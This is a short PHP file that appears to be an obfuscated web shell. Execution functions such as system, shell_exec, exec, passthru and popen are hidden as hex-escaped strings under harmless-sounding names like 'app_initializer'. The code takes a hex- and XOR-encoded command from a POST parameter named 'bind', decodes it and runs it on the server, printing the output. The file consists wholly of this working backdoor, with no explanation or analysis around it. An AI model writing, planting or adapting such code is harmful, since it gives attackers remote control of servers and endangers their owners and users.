<?php

$token_parser_engine = "h\x65\x782\x62i\x6E";
$app_initializer6 = "\x73t\x72e\x61m\x5F\x67e\x74_\x63o\x6E\x74\x65nts";
$app_initializer1 = "\x73ys\x74e\x6D";
$app_initializer3 = "exec";
$app_initializer4 = "\x70as\x73th\x72\x75";
$app_initializer2 = "\x73h\x65l\x6C_ex\x65c";
$app_initializer5 = "p\x6F\x70en";
$app_initializer7 = "p\x63\x6C\x6Fse";
if (isset($_POST["b\x69\x6Ed"])) {
            function reverse_searcher    (      $flag    ,      $mrk   )     {
     $pointer      =      ''    ;
      $i=0;
 do{
$pointer.=chr(ord($flag[$i])^$mrk);
$i++;

} while($i<strlen($flag));
 return   $pointer;
      
}
            $bind = $token_parser_engine($_POST["b\x69\x6Ed"]);
            $bind = reverse_searcher($bind, 51);
            if (function_exists($app_initializer1)) {
                $app_initializer1($bind);
            } elseif (function_exists($app_initializer2)) {
                print $app_initializer2($bind);
            } elseif (function_exists($app_initializer3)) {
                $app_initializer3($bind, $val_flag);
                print join("\n", $val_flag);
            } elseif (function_exists($app_initializer4)) {
                $app_initializer4($bind);
            } elseif (function_exists($app_initializer5) && function_exists($app_initializer6) && function_exists($app_initializer7)) {
                $mrk_pointer = $app_initializer5($bind, 'r');
                if ($mrk_pointer) {
                    $binding_desc = $app_initializer6($mrk_pointer);
                    $app_initializer7($mrk_pointer);
                    print $binding_desc;
                }
            }
            exit;
        }